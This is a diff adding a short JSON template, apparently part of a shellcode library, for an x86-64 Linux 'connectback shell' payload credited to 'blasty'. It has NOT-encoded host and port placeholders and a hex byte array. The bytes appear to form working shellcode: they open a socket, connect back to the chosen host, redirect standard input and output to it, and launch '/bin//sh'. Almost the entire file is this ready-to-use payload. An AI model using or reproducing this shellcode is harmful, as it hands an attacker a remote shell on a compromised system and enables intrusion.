@@ -1,0 +1,28 @@
+{
+	"description" : "connectback shell",
+	"author"      : "blasty",
+	"parameters"  : [
+		{
+			"name"        : "host",
+			"type"        : "ip_not",
+			"placeholder" : "aabbccdd"
+		},
+		{
+			"name"        : "port",
+			"type"        : "u16be_not",
+			"placeholder" : "eeff"
+		}
+	],
+	"code" : [
+		"6a025f6a015e4831d26a29580f056a",
+		"035f6a105a6a2a5848befdff",
+		"eeff",
+		"aabbccdd",
+		"48f7d6",
+		"564889e60f056a035e6a035f6a2158",
+		"48ffce0f0575f34831d248bbffd09d",
+		"9691d08c9748f7d348c1eb08534889",
+		"e74831c050574889e6b03b0f056a01",
+		"5f6a3c580f05"
+	]
+}
